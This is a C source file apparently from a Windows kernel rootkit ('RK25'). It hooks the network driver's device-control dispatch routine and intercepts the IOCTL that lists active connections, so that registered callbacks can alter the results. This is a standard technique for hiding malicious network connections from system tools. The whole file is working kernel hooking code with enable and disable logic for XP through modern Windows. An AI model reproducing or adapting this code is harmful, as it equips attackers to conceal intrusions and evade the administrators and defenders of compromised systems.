#pragma once
#include "rk25_hook_net.h"

#define RK25_PROLOG_HOOK_NET "Hook Net"

PRK25_LC glLCNetDriver;

PDRIVER_OBJECT glObNetDriver = NULL;
ProtoOrigNetDeviceControl glOrigNetDeviceControl = NULL;

NTSTATUS HookCompletionRoutineNetDriver(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP pIrp,
	IN PVOID ctx
) {
	//AsmInt();
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PRK25_ONC saveData = (PRK25_ONC)ctx;
	PVOID eproc = saveData->proc;
	BOOLEAN invOnSec = saveData->invOnSuc;

	// Restoring original context
	pIrpStack->CompletionRoutine = saveData->oldRoutine;
	pIrpStack->Context = saveData->oldContext;
	// if (saveData->invOnSuc) pIrpStack->Control |= SL_INVOKE_ON_SUCCESS;
	ExFreePool(saveData);
	//

	if (NT_SUCCESS(pIrp->IoStatus.Status)) {
		__try {
			PRK25_DCND entry;
			do {
				entry = RK25ListEntryNext(glLCNetDriver);
				if (entry) if (entry->routine) {
					entry->routine(DeviceObject, pIrp, eproc);
				}
			} while (entry != NULL);
			RK25ListFlush(glLCNetDriver);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			PEXCEPTION_RECORD exrec = GetExceptionInformation()->ExceptionRecord;
			RK25_DBG_EXCEPT(RK25_PROLOG_HOOK_NET, exrec);
			RK25ListFlush(glLCNetDriver);
		}
	}

	// Call original routine
	if (pIrpStack->Context && invOnSec && pIrpStack->CompletionRoutine) {
		return pIrpStack->CompletionRoutine(DeviceObject, pIrp, pIrpStack->Context);
	} else if (pIrp->PendingReturned) IoMarkIrpPending(pIrp);
	//

	return STATUS_SUCCESS;
}

//#if defined(_M_X64)
NTSTATUS HookDeviceControlNetDriver(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP pIrp
) {
	PRK25_ONC oldData = NULL;
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);

	if (pIrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSIPROXY_GET_CONNECTIONS) { // IOCTL code
		PRK25_ONC saveData = (PRK25_ONC)ExAllocatePoolWithTag(NonPagedPool, sizeof(RK25_ONC), 'OICD');
		if (saveData) {
			saveData->oldRoutine = pIrpStack->CompletionRoutine;
			saveData->oldContext = pIrpStack->Context;
			saveData->invOnSuc = (pIrpStack->Control & SL_INVOKE_ON_SUCCESS ? TRUE : FALSE);
			saveData->proc = IoGetCurrentProcess();
			
			//switch (pIrpStack->Parameters.DeviceIoControl.InputBufferLength) {
			//case 0x70:
			//case 0x3c:
			//default:
			//	goto exitcode;
			//}
			
			//RK25_DBG_INFO_F(RK25_PROLOG_HOOK_NET, "InputBufferLength: %d",
			//	pIrpStack->Parameters.DeviceIoControl.InputBufferLength);

			//AsmInt();
			pIrpStack->CompletionRoutine = HookCompletionRoutineNetDriver;
			pIrpStack->Context = saveData;
			pIrpStack->Control |= SL_INVOKE_ON_SUCCESS;
		}
	}
//exitcode:
	if (glOrigNetDeviceControl) return glOrigNetDeviceControl(DeviceObject, pIrp);
	else {
		RK25_DBG_ERR(RK25_PROLOG_HOOK_NET, "Panic! DeviceControl pointer is NULL");
		return STATUS_SUCCESS;
	}
}
//#else
//#endif

VOID RK25QueueNetDriverInit() { glLCNetDriver = RK25ListInit(sizeof(RK25_DCND)); }
VOID RK25QueueNetDriverFree() {
	if (RK25IsHookNetDriver()) {
		RK25NetDriverHook(RK25_ACTION_DISABLE | RK25_HOOK_NET_DISPATCHER);
	}
	RK25ListFree(glLCNetDriver);
}
BOOLEAN RK25QueueNetDriverAdd(ProtoHookNetRoutine routine) { return routine ? RK25ListAdd(glLCNetDriver, &(RK25_DCND){routine, 0}) : FALSE; }
BOOLEAN RK25QueueNetDriverIsExists(ProtoHookNetRoutine routine) { return RK25QueueNetDriverGet(routine) ? TRUE : FALSE; }
VOID RK25QueueNetDriverDel(ProtoHookNetRoutine routine) { RK25ListEntryDel(glLCNetDriver, RK25QueueNetDriverGet(routine)); }
PRK25_DCND RK25QueueNetDriverGet(ProtoHookNetRoutine routine) {
	PRK25_DCND entry;
	do {
		entry = (PRK25_DCND)RK25ListEntryNext(glLCNetDriver);
		if (entry) if (entry->routine == routine) break;
	} while (entry != NULL);
	RK25ListFlush(glLCNetDriver);
	return entry;
}

BOOLEAN RK25IsHookNetDriver() { return (glOrigNetDeviceControl && glObNetDriver); }
NTSTATUS RK25NetDriverHook(ULONG attr) {
	NTSTATUS status = STATUS_SUCCESS;

	if ((attr & RK25_ACTION_ENABLE) && RK25IsHookNetDriver()) {
		RK25_DBG_ERR(RK25_PROLOG_HOOK_NET, "Net has been already hooked");
		return STATUS_ALREADY_INITIALIZED;
	}

	if (attr & RK25_HOOK_NET_DISPATCHER) {
		UNICODE_STRING netDeviceName;

		if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
			RtlInitUnicodeString(&netDeviceName, RK25_NET_DRIVER_VISTA_UP);
		}
		else { // if win xp
			RtlInitUnicodeString(&netDeviceName, RK25_NET_DRIVER_XP);
		}

		status = ObReferenceObjectByName(
			&netDeviceName,
			OBJ_CASE_INSENSITIVE,
			NULL,
			0,
			*IoDriverObjectType,
			KernelMode,
			NULL,
			(PVOID*)&glObNetDriver
		);
		if (!NT_SUCCESS(status)) {
			RK25_DBG_ERR_F(RK25_PROLOG_HOOK_NET, "Error get net driver object: 0x%08X", status);
			return status;
		}

		if (attr & RK25_ACTION_ENABLE) {
			if (!glOrigNetDeviceControl && glObNetDriver) {
				glOrigNetDeviceControl = glObNetDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL];
#if defined(_M_X64)
				InterlockedExchange64(
					(LONG64*)&glObNetDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
					(LONG64)HookDeviceControlNetDriver
				);
#else
				InterlockedExchange(
					(LONG*)&glObNetDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
					(LONG)HookDeviceControlNetDriver
				);
#endif
			}
			else {
				RK25_DBG_ERR(RK25_PROLOG_HOOK_NET, "Net has been already hooked");
				status = STATUS_ALREADY_INITIALIZED;
			}
		}
		else if (attr & RK25_ACTION_DISABLE) {
			if (glOrigNetDeviceControl && glObNetDriver) {
#if defined(_M_X64)
				InterlockedExchange64(
					(LONG64*)&glObNetDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
					(LONG64)glOrigNetDeviceControl
				);
#else
				InterlockedExchange(
					(LONG*)&glObNetDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
					(LONG)glOrigNetDeviceControl
				);
#endif
				ObDereferenceObject(glObNetDriver);
				glOrigNetDeviceControl = NULL;
				glObNetDriver = NULL;
			}
			else {
				RK25_DBG_ERR(RK25_PROLOG_HOOK_NET, "Net is not hooked");
				status = STATUS_NOT_FOUND;
			}
		}
		else {
			RK25_DBG_ERR(RK25_PROLOG_HOOK_NET, "Action is not defined");
			status = STATUS_NOT_SUPPORTED;
		}
	}
	return status;
}